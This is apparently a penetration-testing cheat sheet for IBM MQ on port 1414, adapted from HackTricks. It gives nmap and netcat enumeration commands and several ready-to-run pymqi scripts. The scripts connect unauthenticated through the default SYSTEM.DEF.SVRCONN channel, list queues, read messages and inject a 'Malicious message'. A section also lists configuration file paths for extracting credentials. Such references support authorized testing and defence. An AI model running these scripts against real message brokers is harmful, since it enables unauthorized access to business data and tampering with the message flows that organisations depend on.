# Port 1414 - IBM MQ (WebSphere MQ)

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Post Exploitation](#post-exploitation)

---

## Enumeration

### Nmap Scripts

```shell
nmap -sV -sC -p1414 $rhost
```

### Banner Grabbing

```shell
nc -vn $rhost 1414
```

### MQ Explorer

```shell
# Use IBM MQ Explorer GUI tool
# Download from IBM website
```

### Check Queue Manager

```shell
# Using amqsput (IBM MQ client tools)
amqsput QUEUE QUEUEMANAGER

# Check channel status
runmqchl -c CHANNEL -m QMGR
```

---

## Exploitation

### Default Credentials

```shell
# Common default settings
# Queue Manager: QMGR
# Channel: SYSTEM.DEF.SVRCONN
# No authentication by default on older versions
```

### Connect Without Authentication

```shell
# Using pymqi (Python IBM MQ library)
pip install pymqi

# Python script
python3 << 'EOF'
import pymqi

queue_manager = 'QMGR'
channel = 'SYSTEM.DEF.SVRCONN'
host = '$rhost'
port = '1414'
conn_info = '%s(%s)' % (host, port)

qmgr = pymqi.connect(queue_manager, channel, conn_info)
print("[+] Connected to Queue Manager")
qmgr.disconnect()
EOF
```

### Message Enumeration

```shell
# List queues
python3 << 'EOF'
import pymqi

queue_manager = 'QMGR'
channel = 'SYSTEM.DEF.SVRCONN'
host = '$rhost'
port = '1414'
conn_info = '%s(%s)' % (host, port)

qmgr = pymqi.connect(queue_manager, channel, conn_info)
pcf = pymqi.PCFExecute(qmgr)

# List all queues
response = pcf.MQCMD_INQUIRE_Q({'MQCA_Q_NAME': '*'})
for queue in response:
    print(queue['MQCA_Q_NAME'])

qmgr.disconnect()
EOF
```

### Read Messages from Queue

```shell
python3 << 'EOF'
import pymqi

queue_manager = 'QMGR'
channel = 'SYSTEM.DEF.SVRCONN'
host = '$rhost'
port = '1414'
queue_name = 'TARGET.QUEUE'
conn_info = '%s(%s)' % (host, port)

qmgr = pymqi.connect(queue_manager, channel, conn_info)
queue = pymqi.Queue(qmgr, queue_name)

# Browse messages (non-destructive)
md = pymqi.MD()
gmo = pymqi.GMO()
gmo.Options = pymqi.CMQC.MQGMO_BROWSE_FIRST

while True:
    try:
        message = queue.get(None, md, gmo)
        print(message)
        gmo.Options = pymqi.CMQC.MQGMO_BROWSE_NEXT
        md = pymqi.MD()
    except pymqi.MQMIError as e:
        if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_NO_MSG_AVAILABLE:
            break
        raise

queue.close()
qmgr.disconnect()
EOF
```

---

## Post Exploitation

### Write Messages

```shell
python3 << 'EOF'
import pymqi

queue_manager = 'QMGR'
channel = 'SYSTEM.DEF.SVRCONN'
host = '$rhost'
port = '1414'
queue_name = 'TARGET.QUEUE'
conn_info = '%s(%s)' % (host, port)

qmgr = pymqi.connect(queue_manager, channel, conn_info)
queue = pymqi.Queue(qmgr, queue_name)

# Put message
queue.put('Malicious message')
print("[+] Message sent")

queue.close()
qmgr.disconnect()
EOF
```

### Extract Credentials

```shell
# Configuration files locations
/var/mqm/qmgrs/QMGR/
/var/mqm/qmgrs/QMGR/qm.ini
/var/mqm/qmgrs/QMGR/@ipcc/
```

### Channel Security

```shell
# Check channel authentication
runmqsc QMGR
DISPLAY CHANNEL(*) MCAUSER
DISPLAY AUTHINFO(*) ALL
end
```

---

## Tools

- pymqi: <https://github.com/dsuch/pymqi>
- IBM MQ Explorer: IBM Website
- punch-q: <https://github.com/sensepost/punch-q>

---

## References

- [HackTricks - IBM MQ](https://book.hacktricks.wiki/network-services-pentesting/1414-pentesting-ibmmq.html)
